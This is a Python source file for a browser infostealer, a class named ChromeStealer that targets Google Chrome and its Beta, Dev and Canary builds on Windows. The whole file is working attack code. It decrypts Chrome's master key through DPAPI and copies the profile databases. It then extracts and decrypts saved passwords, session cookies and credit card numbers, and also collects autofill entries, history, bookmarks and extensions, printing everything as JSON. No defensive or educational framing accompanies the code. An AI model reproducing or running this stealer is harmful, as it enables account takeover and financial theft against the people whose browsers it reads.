import os
import sys
import json
import base64
import sqlite3
import shutil
import tempfile
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime
from typing import Dict, List, Any, Optional

class ChromeStealer:
    def __init__(self):
        self.localappdata = os.getenv("LOCALAPPDATA")
        self.appdata = os.getenv("APPDATA")
        self.temp_dir = tempfile.gettempdir()
        self.chrome_paths = self.get_chrome_paths()
    
    def get_chrome_paths(self):
        paths = []
        
        chrome_variants = [
            {
                "name": "Chrome",
                "path": os.path.join(self.localappdata, "Google", "Chrome", "User Data"),
                "local_state": os.path.join(self.localappdata, "Google", "Chrome", "User Data", "Local State")
            },
            {
                "name": "Chrome Beta",
                "path": os.path.join(self.localappdata, "Google", "Chrome Beta", "User Data"),
                "local_state": os.path.join(self.localappdata, "Google", "Chrome Beta", "User Data", "Local State")
            },
            {
                "name": "Chrome Dev",
                "path": os.path.join(self.localappdata, "Google", "Chrome Dev", "User Data"),
                "local_state": os.path.join(self.localappdata, "Google", "Chrome Dev", "User Data", "Local State")
            },
            {
                "name": "Chrome Canary",
                "path": os.path.join(self.localappdata, "Google", "Chrome SxS", "User Data"),
                "local_state": os.path.join(self.localappdata, "Google", "Chrome SxS", "User Data", "Local State")
            }
        ]
        
        for variant in chrome_variants:
            if os.path.exists(variant["path"]):
                paths.append(variant)
        
        return paths
    
    def get_profiles(self, chrome_path):
        profiles = ["Default"]
        
        try:
            if os.path.exists(chrome_path):
                for item in os.listdir(chrome_path):
                    if item.startswith("Profile"):
                        profiles.append(item)
        except:
            pass
        
        return profiles
    
    def get_encryption_key(self, local_state_path):
        try:
            if not os.path.exists(local_state_path):
                return None
            
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove "DPAPI" prefix
            
            decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return decrypted_key
        except:
            return None
    
    def decrypt_aes_gcm(self, encrypted_value, key):
        try:
            if not encrypted_value.startswith(b"v10") and not encrypted_value.startswith(b"v11"):
                return None
            
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode("utf-8")
        except:
            return None
    
    def decrypt_dpapi(self, encrypted_value):
        try:
            decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
            return decrypted.decode("utf-8")
        except:
            return None
    
    def decrypt_value(self, encrypted_value, key):
        if key:
            result = self.decrypt_aes_gcm(encrypted_value, key)
            if result:
                return result
        
        result = self.decrypt_dpapi(encrypted_value)
        return result if result else ""
    
    def steal_cookies(self):
        cookies = []
        
        for chrome in self.chrome_paths:
            key = self.get_encryption_key(chrome["local_state"])
            profiles = self.get_profiles(chrome["path"])
            
            for profile in profiles:
                cookie_db = os.path.join(chrome["path"], profile, "Network", "Cookies")
                
                if not os.path.exists(cookie_db):
                    cookie_db = os.path.join(chrome["path"], profile, "Cookies")
                
                if os.path.exists(cookie_db):
                    try:
                        temp_db = os.path.join(self.temp_dir, f"chrome_cookies_{profile}.db")
                        shutil.copy2(cookie_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        cursor.execute("""
                            SELECT host_key, name, encrypted_value, path, expires_utc, 
                                   is_secure, is_httponly, creation_utc, last_access_utc
                            FROM cookies
                        """)
                        
                        for row in cursor.fetchall():
                            host, name, encrypted_value, path, expires, secure, httponly, creation, last_access = row
                            
                            decrypted_value = self.decrypt_value(encrypted_value, key)
                            
                            cookies.append({
                                "browser": chrome["name"],
                                "profile": profile,
                                "host": host,
                                "name": name,
                                "value": decrypted_value,
                                "path": path,
                                "expires_utc": expires,
                                "is_secure": secure,
                                "is_httponly": httponly,
                                "creation_utc": creation,
                                "last_access_utc": last_access
                            })
                        
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass
        
        return cookies
    
    def steal_passwords(self):
        passwords = []
        
        for chrome in self.chrome_paths:
            key = self.get_encryption_key(chrome["local_state"])
            profiles = self.get_profiles(chrome["path"])
            
            for profile in profiles:
                login_db = os.path.join(chrome["path"], profile, "Login Data")
                
                if os.path.exists(login_db):
                    try:
                        temp_db = os.path.join(self.temp_dir, f"chrome_logins_{profile}.db")
                        shutil.copy2(login_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        cursor.execute("""
                            SELECT origin_url, action_url, username_element, username_value,
                                   password_element, password_value, submit_element,
                                   signon_realm, date_created, times_used, date_last_used
                            FROM logins
                        """)
                        
                        for row in cursor.fetchall():
                            origin_url, action_url, username_element, username, password_element, encrypted_password, submit_element, signon_realm, date_created, times_used, date_last_used = row
                            
                            decrypted_password = self.decrypt_value(encrypted_password, key)
                            
                            passwords.append({
                                "browser": chrome["name"],
                                "profile": profile,
                                "origin_url": origin_url,
                                "action_url": action_url,
                                "username_element": username_element,
                                "username": username,
                                "password_element": password_element,
                                "password": decrypted_password,
                                "submit_element": submit_element,
                                "signon_realm": signon_realm,
                                "date_created": date_created,
                                "times_used": times_used,
                                "date_last_used": date_last_used
                            })
                        
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass
        
        return passwords
    
    def steal_history(self):
        history = []
        
        for chrome in self.chrome_paths:
            profiles = self.get_profiles(chrome["path"])
            
            for profile in profiles:
                history_db = os.path.join(chrome["path"], profile, "History")
                
                if os.path.exists(history_db):
                    try:
                        temp_db = os.path.join(self.temp_dir, f"chrome_history_{profile}.db")
                        shutil.copy2(history_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        cursor.execute("""
                            SELECT url, title, visit_count, typed_count, last_visit_time, hidden
                            FROM urls
                            ORDER BY last_visit_time DESC
                            LIMIT 200
                        """)
                        
                        for row in cursor.fetchall():
                            url, title, visit_count, typed_count, last_visit, hidden = row
                            
                            # Convert Chrome timestamp to datetime
                            if last_visit:
                                try:
                                    last_visit_dt = datetime(1601, 1, 1) + timedelta(microseconds=last_visit)
                                    last_visit_str = last_visit_dt.isoformat()
                                except:
                                    last_visit_str = str(last_visit)
                            else:
                                last_visit_str = None
                            
                            history.append({
                                "browser": chrome["name"],
                                "profile": profile,
                                "url": url,
                                "title": title,
                                "visit_count": visit_count,
                                "typed_count": typed_count,
                                "last_visit": last_visit_str,
                                "hidden": hidden
                            })
                        
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass
        
        return history
    
    def steal_bookmarks(self):
        bookmarks = []
        
        for chrome in self.chrome_paths:
            profiles = self.get_profiles(chrome["path"])
            
            for profile in profiles:
                bookmarks_path = os.path.join(chrome["path"], profile, "Bookmarks")
                
                if os.path.exists(bookmarks_path):
                    try:
                        with open(bookmarks_path, "r", encoding="utf-8") as f:
                            bookmarks_data = json.load(f)
                        
                        def extract_bookmarks(node, level=0):
                            if isinstance(node, dict):
                                if node.get("type") == "url":
                                    bookmarks.append({
                                        "browser": chrome["name"],
                                        "profile": profile,
                                        "name": node.get("name", ""),
                                        "url": node.get("url", ""),
                                        "date_added": node.get("date_added", "")
                                    })
                                elif "children" in node:
                                    for child in node["children"]:
                                        extract_bookmarks(child, level + 1)
                            elif isinstance(node, list):
                                for item in node:
                                    extract_bookmarks(item, level)
                        
                        extract_bookmarks(bookmarks_data.get("roots", {}))
                    except:
                        pass
        
        return bookmarks
    
    def steal_autofill(self):
        autofill = []
        
        for chrome in self.chrome_paths:
            profiles = self.get_profiles(chrome["path"])
            
            for profile in profiles:
                web_db = os.path.join(chrome["path"], profile, "Web Data")
                
                if os.path.exists(web_db):
                    try:
                        temp_db = os.path.join(self.temp_dir, f"chrome_autofill_{profile}.db")
                        shutil.copy2(web_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        cursor.execute("""
                            SELECT name, value, value_lower, date_created, date_last_used, count
                            FROM autofill
                            LIMIT 100
                        """)
                        
                        for row in cursor.fetchall():
                            name, value, value_lower, date_created, date_last_used, count = row
                            
                            autofill.append({
                                "browser": chrome["name"],
                                "profile": profile,
                                "name": name,
                                "value": value,
                                "value_lower": value_lower,
                                "date_created": date_created,
                                "date_last_used": date_last_used,
                                "count": count
                            })
                        
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass
        
        return autofill
    
    def steal_credit_cards(self):
        credit_cards = []
        
        for chrome in self.chrome_paths:
            key = self.get_encryption_key(chrome["local_state"])
            profiles = self.get_profiles(chrome["path"])
            
            for profile in profiles:
                web_db = os.path.join(chrome["path"], profile, "Web Data")
                
                if os.path.exists(web_db):
                    try:
                        temp_db = os.path.join(self.temp_dir, f"chrome_cc_{profile}.db")
                        shutil.copy2(web_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        cursor.execute("""
                            SELECT name_on_card, expiration_month, expiration_year, 
                                   card_number_encrypted, billing_address_id, date_modified
                            FROM credit_cards
                        """)
                        
                        for row in cursor.fetchall():
                            name, exp_month, exp_year, encrypted_number, billing_id, date_modified = row
                            
                            decrypted_number = self.decrypt_value(encrypted_number, key)
                            
                            credit_cards.append({
                                "browser": chrome["name"],
                                "profile": profile,
                                "name_on_card": name,
                                "expiration_month": exp_month,
                                "expiration_year": exp_year,
                                "card_number": decrypted_number,
                                "billing_address_id": billing_id,
                                "date_modified": date_modified
                            })
                        
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass
        
        return credit_cards
    
    def steal_extensions(self):
        extensions = []
        
        for chrome in self.chrome_paths:
            profiles = self.get_profiles(chrome["path"])
            
            for profile in profiles:
                extensions_path = os.path.join(chrome["path"], profile, "Extensions")
                
                if os.path.exists(extensions_path):
                    try:
                        for ext_id in os.listdir(extensions_path):
                            ext_path = os.path.join(extensions_path, ext_id)
                            
                            if os.path.isdir(ext_path):
                                manifest_path = os.path.join(ext_path, "manifest.json")
                                if os.path.exists(manifest_path):
                                    with open(manifest_path, "r", encoding="utf-8") as f:
                                        manifest = json.load(f)
                                    
                                    extensions.append({
                                        "browser": chrome["name"],
                                        "profile": profile,
                                        "id": ext_id,
                                        "name": manifest.get("name", ""),
                                        "version": manifest.get("version", ""),
                                        "description": manifest.get("description", "")
                                    })
                    except:
                        pass
        
        return extensions
    
    def steal_all(self):
        return {
            "cookies": self.steal_cookies(),
            "passwords": self.steal_passwords(),
            "history": self.steal_history(),
            "bookmarks": self.steal_bookmarks(),
            "autofill": self.steal_autofill(),
            "credit_cards": self.steal_credit_cards(),
            "extensions": self.steal_extensions()
        }

if __name__ == "__main__":
    from datetime import timedelta
    
    stealer = ChromeStealer()
    data = stealer.steal_all()
    print(json.dumps(data, indent=2, default=str))